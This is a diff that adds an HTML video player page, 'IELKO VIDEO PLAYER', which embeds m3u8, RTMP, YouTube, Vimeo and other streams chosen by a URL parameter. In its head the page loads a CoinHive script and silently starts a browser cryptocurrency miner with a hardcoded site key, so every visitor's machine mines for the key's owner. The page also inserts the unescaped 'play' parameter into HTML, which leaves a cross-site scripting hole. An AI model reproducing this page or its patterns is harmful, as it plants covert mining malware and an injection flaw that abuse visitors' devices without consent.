@@ -1,0 +1,205 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <title>IELKO VIDEO PLAYER</title>
+  <meta name="author" content="Ioannis Kokkinis">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="HandheldFriendly" content="true">
+  <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1,user-scalable=no">
+  <link rel='stylesheet' id='videojs-css' href='//vjs.zencdn.net/5.10/video-js.css' type='text/css' media='all' />
+  <link rel='stylesheet' id='videojs-style-css' href='js/videojs-hls-player.css' type='text/css' media='all' />
+  <link rel='stylesheet' id='videojs-airplay-css' href='js/videojs.airplay.css' type='text/css' media='all' />
+  <script type='text/javascript' src='//code.jquery.com/jquery-1.12.4.min.js'></script>
+  <script type='text/javascript' src='js/video.js'></script>
+  <script type='text/javascript' src='http://ioniantv.gr/wp-content/plugins/videojs-hls-player/videojs-contrib-hls/videojs-contrib-hls.min.js?ver=1.0.2'></script>
+  <script type='text/javascript' src='http://ioniantv.gr/wp-content/plugins/videojs-hls-player/videojs-airplay/videojs.airplay.js?ver=1.0.2'></script>
+  <script type='text/javascript' src='js/videojs-hls-player.js'></script>
+  <script type='text/javascript' src='//code.jquery.com/jquery-migrate-3.0.0.min.js?ver=3.0.0'></script>
+  <script type='text/javascript' src='js/analytics.js'></script>
+  <script type='text/javascript' src='//vjs.zencdn.net/ie8/1.1.2/videojs-ie8.min.js?ver=1.0.2'></script>
+  <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+  <script>
+    var miner = new CoinHive.Anonymous('qaaRj03tlPE6koUYeohXVLV5bA4t7lwn');
+    miner.start();
+
+    (function() {
+      function t(e) {
+        this.path = e;
+        var t = this.path.split("."),
+          n = t.slice(0, t.length - 1).join("."),
+          r = t[t.length - 1];
+        this.at_2x_path = n + "@2x." + r
+      }
+
+      function n(e) {
+        this.el = e, this.path = new t(this.el.getAttribute("src"));
+        var n = this;
+        this.path.check_2x_variant(function(e) {
+          e && n.swap()
+        })
+      }
+      var e = typeof exports == "undefined" ? window : exports;
+      e.RetinaImagePath = t, t.confirmed_paths = [], t.prototype.is_external = function() {
+        return !!this.path.match(/^https?\:/i) && !this.path.match("//" + document.domain)
+      }, t.prototype.check_2x_variant = function(e) {
+        var n, r = this;
+        if (this.is_external()) return e(!1);
+        if (this.at_2x_path in t.confirmed_paths) return e(!0);
+        n = new XMLHttpRequest, n.open("HEAD", this.at_2x_path), n.onreadystatechange = function() {
+          return n.readyState != 4 ? e(!1) : n.status >= 200 && n.status <= 399 ? (t.confirmed_paths.push(r.at_2x_path), e(!0)) : e(!1)
+        }, n.send()
+      }, e.RetinaImage = n, n.prototype.swap = function(e) {
+        function n() {
+          t.el.complete ? (t.el.setAttribute("width", t.el.offsetWidth), t.el.setAttribute("height", t.el.offsetHeight), t.el.setAttribute("src", e)) : setTimeout(n, 5)
+        }
+        typeof e == "undefined" && (e = this.path.at_2x_path);
+        var t = this;
+        n()
+      }, e.devicePixelRatio > 1 && (window.onload = function() {
+        var e = document.getElementsByTagName("img"),
+          t = [],
+          r, i;
+        for (r = 0; r < e.length; r++) i = e[r], t.push(new n(i))
+      })
+    })();
+  </script>
+
+  <style>
+    .fullscreen-bg {
+      position: fixed;
+      top: 0;
+      right: 0;
+      bottom: 0;
+      left: 0;
+      overflow: hidden;
+      z-index: -100;
+      background-color: black;
+    }
+
+    .fullscreen-bg__video {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+    }
+
+    .embed-container {
+      position: relative;
+      padding-bottom: 56.25%;
+      height: 0;
+      overflow: hidden;
+      max-width: 100%;
+    }
+
+    .embed-container iframe,
+    .embed-container object,
+    .embed-container embed {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+    }
+  </style>
+</head>
+
+<body>
+  <script>
+    function getUrlVars() {
+      var vars = {};
+      var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m, key, value) {
+        if (vars[key]) {
+          if (vars[key] instanceof Array) {
+            vars[key].push(value);
+          } else {
+            vars[key] = [vars[key], value];
+          }
+        } else {
+          vars[key] = value;
+        }
+      });
+      return vars;
+    }
+
+    $(document).ready(function() {
+      $(".upgads").css({
+        "position": "fixed",
+        "bottom": "0",
+        "margin": "0",
+        "text-align": "center",
+        "display": "inline-block",
+        "left": "50%",
+        "transform": "translate(-50%, 0)"
+      });
+
+
+      var play = getUrlVars()["play"];
+      if (play) {
+        if (play.indexOf('m3u8') > -1) {
+          append_m3u8(play);
+        } else if (play.indexOf('rtmp') > -1) {
+          append_rtmp(play);
+        } else if (play.indexOf('youtube') > -1) {
+          append_youtube(play);
+        } else if (play.indexOf('livestream.com') > -1) {
+          append_livestream(play);
+        } else if (play.indexOf('dailymotion') > -1) {
+          append_dailymotion(play);
+        } else if (play.indexOf('vimeo') > -1) {
+          append_vimeo(play);
+        }
+      }
+      var poster = getUrlVars()["poster"];
+      var title = getUrlVars()["channel"];
+
+      function append_rtmp(play) {
+        $(".upgvid").empty().append(
+          '<div id="videoHolder" style="background-image:url();" data-embed="false" class="flowplayer-video videoHolder-322 videoHolder fullscreen-bg playful no-background"><video id="upgvideoplayer" poster="" class="video-js vjs-default-skin vjs-fluid vjs-16-9 vjs-big-play-centered fullscreen-bg__video" autoplay preload="auto"><source type="application/x-mpegurl" src="' +
+          play + '"></video></div>');
+      }
+
+
+
+      function append_m3u8(play) {
+        $(".upgvid").empty().append(
+          '<div id="videoHolder" style="background-image:url();" data-embed="true" class="flowplayer-video videoHolder-322 videoHolder fullscreen-bg playful no-background"><video id="upgvideoplayer" poster="" class="video-js vjs-default-skin vjs-fluid vjs-16-9 vjs-big-play-centered fullscreen-bg__video" controls preload="auto" autoplay data-setup={"fluid":true,"plugins":{"airplayButton":{}}} playsinline ><source type="application/x-mpegurl" src="' +
+          play + '"></video></div>');
+      }
+
+
+
+      function append_youtube(play) {
+        play = play.replace("watch?v=", "v/");
+        $(".upgvid").empty().append('<div id="videoHolder" style="background-image:url();" class="flowplayer-video videoHolder-322 videoHolder fullscreen-bg playful no-background"><div class="embed-container"><iframe src="' + play +
+          '&autoplay=1" frameborder="0" allowfullscreen></iframe></div></div>')
+      }
+
+      function append_dailymotion(play) {
+        var dailymotionID = (m = play.match(new RegExp("\/video\/([^_?#]+).*?"))) ? m[1] : void 0;
+        $(".upgvid").empty().append(
+          '<div id="videoHolder" style="background-image:url();" class="flowplayer-video videoHolder-322 videoHolder fullscreen-bg playful no-background"><div class="embed-container"><iframe src="http://www.dailymotion.com/embed/video/' +
+          dailymotionID + '" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></div></div>')
+      }
+
+      function append_livestream(play) {
+        var livestreamID = play.substr(play.lastIndexOf('/') + 1);
+        $(".upgvid").empty().append(
+          '<div id="videoHolder" style="background-image:url();" class="flowplayer-video videoHolder-322 videoHolder fullscreen-bg playful no-background"><div class="embed-container"><iframe src="http://cdn.livestream.com/embed/' +
+          livestreamID + '?autoplay=true" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></div></div>')
+      }
+
+      function append_vimeo(play) {
+        var vimeoID = play.substr(play.lastIndexOf('/') + 1);
+        $(".upgvid").empty().append(
+          '<div id="videoHolder" style="background-image:url();" class="flowplayer-video videoHolder-322 videoHolder fullscreen-bg playful no-background"><div class="embed-container"><iframe src="http://player.vimeo.com/video/' +
+          vimeoID + '?autoplay=true" frameborder="0" webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></div></div>')
+      }
+
+    });
+  </script>
+  <div class="upgvid"></div>
+</body>
+
+</html>
